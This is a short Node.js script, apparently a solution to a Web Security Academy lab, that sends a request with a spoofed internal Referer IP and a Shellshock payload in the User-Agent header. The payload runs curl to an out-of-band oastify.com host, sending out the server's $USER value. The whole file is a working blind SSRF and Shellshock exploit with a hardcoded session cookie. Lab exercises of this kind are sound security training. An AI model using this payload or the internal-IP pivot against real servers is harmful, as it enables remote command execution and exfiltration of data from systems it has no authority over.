import fetch from "node-fetch";

const attack = async () => {
  for (let i = 189; i < 190; i++) {
    console.log(i);
    await fetch(
      "https://0a84009803c39be0c0e27a31006800c6.web-security-academy.net/product?productId=1",
      {
        headers: {
          accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
          "accept-language": "en-US,en;q=0.9,es;q=0.8",
          "sec-ch-ua":
            '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"macOS"',
          "sec-fetch-dest": "document",
          "sec-fetch-mode": "navigate",
          "sec-fetch-site": "same-origin",
          "sec-fetch-user": "?1",
          "upgrade-insecure-requests": "1",
          cookie: "session=PH8BjKkby8pB91K4F0KnIGYm4jNYhsz0",
          Referer: `http://192.168.0.${i}:8080`,
          //   Referer: `https://p7xbqmd6i5f8iuqhyll37kn1xs3kr9.oastify.com`,
          "User-Agent": `() { :; }; curl https://p7xbqmd6i5f8iuqhyll37kn1xs3kr9.oastify.com/$USER`,
          "Referrer-Policy": "strict-origin-when-cross-origin",
        },
        // body: null,
        method: "GET",
      }
    );
  }
};

attack();
